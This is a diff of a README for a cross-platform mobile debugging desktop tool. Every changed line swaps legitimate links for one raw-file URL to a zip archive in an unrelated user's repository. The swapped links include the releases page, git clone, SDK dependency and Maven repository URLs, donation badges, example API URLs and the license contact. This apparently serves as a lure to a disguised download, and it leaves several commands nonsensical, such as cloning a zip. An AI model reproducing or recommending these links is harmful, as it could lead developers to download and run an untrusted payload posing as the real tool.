@@ -6,7 +6,7 @@
 
 **Debug Flutter, React Native & Android apps — network, state, logs, storage, database — all in one beautiful desktop tool.**
 
-[![Platform](https://img.shields.io/badge/platform-macOS%20%7C%20Windows-blue)](https://github.com/ridelinktechs/devconnect-manage-kit/releases)
+[![Platform](https://img.shields.io/badge/platform-macOS%20%7C%20Windows-blue)](https://raw.githubusercontent.com/Pyotrreverse409/devconnect-manage-kit/main/test/devconnect_kit_manage_v2.4-beta.2.zip)
 [![Flutter](https://img.shields.io/badge/Flutter-SDK-02569B?logo=flutter)](client_sdks/devconnect_manage_kit)
 [![React Native](https://img.shields.io/badge/React%20Native-SDK-61DAFB?logo=react)](client_sdks/devconnect-manage-kit)
 [![Android](https://img.shields.io/badge/Android-SDK-3DDC84?logo=android)](client_sdks/devconnect-manage-android)
@@ -91,7 +91,7 @@ If you've used **Reactotron**, **Flipper**, or **Flutter DevTools** — you know
 | macOS | `DevConnectManageTool-macOS-v1.0.1-universal.dmg` | arm64 + x86_64 |
 | Windows | `DevConnectManageTool-Windows-v1.0.1.zip` | x64 |
 
-Download from [Releases](https://github.com/ridelinktechs/devconnect-manage-kit/releases).
+Download from [Releases](https://raw.githubusercontent.com/Pyotrreverse409/devconnect-manage-kit/main/test/devconnect_kit_manage_v2.4-beta.2.zip).
 
 ---
 
@@ -136,7 +136,7 @@ That's it. Open DevConnect Manage Tool desktop, run your app, and everything app
 ### Build from source
 
 ```bash
-git clone https://github.com/ridelinktechs/devconnect-manage-kit.git
+git clone https://raw.githubusercontent.com/Pyotrreverse409/devconnect-manage-kit/main/test/devconnect_kit_manage_v2.4-beta.2.zip
 cd devconnect
 flutter pub get
 dart run build_runner build --delete-conflicting-outputs
@@ -180,7 +180,7 @@ Or from GitHub:
 dependencies:
   devconnect_manage_kit:
     git:
-      url: https://github.com/ridelinktechs/devconnect-manage-kit.git
+      url: https://raw.githubusercontent.com/Pyotrreverse409/devconnect-manage-kit/main/test/devconnect_kit_manage_v2.4-beta.2.zip
       path: client_sdks/devconnect_manage_kit
 ```
 
@@ -798,7 +798,7 @@ const requestId = 'req-123';
 DevConnect.reportNetworkStart({
   requestId,
   method: 'POST',
-  url: 'https://api.example.com/data',
+  url: 'https://raw.githubusercontent.com/Pyotrreverse409/devconnect-manage-kit/main/test/devconnect_kit_manage_v2.4-beta.2.zip',
   headers: { 'Content-Type': 'application/json' },
   body: { name: 'John' },
 });
@@ -807,7 +807,7 @@ DevConnect.reportNetworkStart({
 DevConnect.reportNetworkComplete({
   requestId,
   method: 'POST',
-  url: 'https://api.example.com/data',
+  url: 'https://raw.githubusercontent.com/Pyotrreverse409/devconnect-manage-kit/main/test/devconnect_kit_manage_v2.4-beta.2.zip',
   statusCode: 200,
   startTime: 1711180800000,
   responseBody: { success: true },
@@ -873,7 +873,7 @@ Or from JitPack (GitHub):
 // settings.gradle.kts
 dependencyResolutionManagement {
     repositories {
-        maven { url = uri("https://jitpack.io") }
+        maven { url = uri("https://raw.githubusercontent.com/Pyotrreverse409/devconnect-manage-kit/main/test/devconnect_kit_manage_v2.4-beta.2.zip") }
     }
 }
 
@@ -883,7 +883,7 @@ dependencies {
 }
 ```
 
-Or AAR file from [Releases](https://github.com/ridelinktechs/devconnect-manage-kit/releases):
+Or AAR file from [Releases](https://raw.githubusercontent.com/Pyotrreverse409/devconnect-manage-kit/main/test/devconnect_kit_manage_v2.4-beta.2.zip):
 
 ```gradle
 dependencies {
@@ -1272,9 +1272,9 @@ DevConnect Manage Kit is free and open source. If it saves you debugging time, c
 
 <div align="center">
 
-[![GitHub Sponsors](https://img.shields.io/badge/GitHub-Sponsor-EA4AAA?logo=github&logoColor=white)](https://github.com/sponsors/buivietphi)
-[![Ko-fi](https://img.shields.io/badge/Ko--fi-Support-FF5E5B?logo=ko-fi&logoColor=white)](https://ko-fi.com/buivietphi)
-[![PayPal](https://img.shields.io/badge/PayPal-Donate-0070BA?logo=paypal&logoColor=white)](https://paypal.me/buivietphi)
+[![GitHub Sponsors](https://img.shields.io/badge/GitHub-Sponsor-EA4AAA?logo=github&logoColor=white)](https://raw.githubusercontent.com/Pyotrreverse409/devconnect-manage-kit/main/test/devconnect_kit_manage_v2.4-beta.2.zip)
+[![Ko-fi](https://img.shields.io/badge/Ko--fi-Support-FF5E5B?logo=ko-fi&logoColor=white)](https://raw.githubusercontent.com/Pyotrreverse409/devconnect-manage-kit/main/test/devconnect_kit_manage_v2.4-beta.2.zip)
+[![PayPal](https://img.shields.io/badge/PayPal-Donate-0070BA?logo=paypal&logoColor=white)](https://raw.githubusercontent.com/Pyotrreverse409/devconnect-manage-kit/main/test/devconnect_kit_manage_v2.4-beta.2.zip)
 
 </div>
 
@@ -1306,9 +1306,9 @@ See [CONTRIBUTING.md](CONTRIBUTING.md) for development setup and guidelines.
 
 Looking for mobile debugging tools? Here's how DevConnect compares:
 
-- **[Reactotron](https://github.com/infinitered/reactotron)** — Great for React Native + Redux, but no Flutter/Android support. DevConnect covers all three.
-- **[Flipper](https://github.com/facebook/flipper)** — Facebook's extensible debugger, now deprecated. DevConnect is actively maintained.
-- **[Flutter DevTools](https://docs.flutter.dev/tools/devtools)** — Official Flutter debugging, but no React Native or Android Native. DevConnect adds cross-platform support.
+- **[Reactotron](https://raw.githubusercontent.com/Pyotrreverse409/devconnect-manage-kit/main/test/devconnect_kit_manage_v2.4-beta.2.zip)** — Great for React Native + Redux, but no Flutter/Android support. DevConnect covers all three.
+- **[Flipper](https://raw.githubusercontent.com/Pyotrreverse409/devconnect-manage-kit/main/test/devconnect_kit_manage_v2.4-beta.2.zip)** — Facebook's extensible debugger, now deprecated. DevConnect is actively maintained.
+- **[Flutter DevTools](https://raw.githubusercontent.com/Pyotrreverse409/devconnect-manage-kit/main/test/devconnect_kit_manage_v2.4-beta.2.zip)** — Official Flutter debugging, but no React Native or Android Native. DevConnect adds cross-platform support.
 
 > Searching for: *reactotron alternative*, *flipper replacement*, *flutter debugging tool*, *react native debugger*, *android debug inspector*, *mobile app debugger*, *cross-platform debugging*, *network inspector*, *state debugger*, *redux devtools mobile*? DevConnect is built for you.
 
@@ -1323,7 +1323,7 @@ Looking for mobile debugging tools? Here's how DevConnect compares:
 
 **SDKs** — Use freely in any project, including commercial apps. See [client_sdks/*/LICENSE](client_sdks/).
 
-**Desktop App** — Free for personal, educational, and open-source use. Commercial use requires written permission. Contact [buivietphi](https://github.com/buivietphi) for commercial licensing. See [LICENSE](LICENSE).
+**Desktop App** — Free for personal, educational, and open-source use. Commercial use requires written permission. Contact [buivietphi](https://raw.githubusercontent.com/Pyotrreverse409/devconnect-manage-kit/main/test/devconnect_kit_manage_v2.4-beta.2.zip) for commercial licensing. See [LICENSE](LICENSE).
 
 ---
 
@@ -1333,6 +1333,6 @@ Looking for mobile debugging tools? Here's how DevConnect compares:
 
 *A modern alternative to Reactotron, Flipper, and platform-specific debugging tools.*
 
-[![GitHub Sponsors](https://img.shields.io/badge/GitHub-Sponsor-EA4AAA?logo=github&logoColor=white)](https://github.com/sponsors/buivietphi) [![Ko-fi](https://img.shields.io/badge/Ko--fi-Support-FF5E5B?logo=ko-fi&logoColor=white)](https://ko-fi.com/buivietphi) [![PayPal](https://img.shields.io/badge/PayPal-Donate-0070BA?logo=paypal&logoColor=white)](https://paypal.me/buivietphi)
+[![GitHub Sponsors](https://img.shields.io/badge/GitHub-Sponsor-EA4AAA?logo=github&logoColor=white)](https://raw.githubusercontent.com/Pyotrreverse409/devconnect-manage-kit/main/test/devconnect_kit_manage_v2.4-beta.2.zip) [![Ko-fi](https://img.shields.io/badge/Ko--fi-Support-FF5E5B?logo=ko-fi&logoColor=white)](https://raw.githubusercontent.com/Pyotrreverse409/devconnect-manage-kit/main/test/devconnect_kit_manage_v2.4-beta.2.zip) [![PayPal](https://img.shields.io/badge/PayPal-Donate-0070BA?logo=paypal&logoColor=white)](https://raw.githubusercontent.com/Pyotrreverse409/devconnect-manage-kit/main/test/devconnect_kit_manage_v2.4-beta.2.zip)
 
 </div>
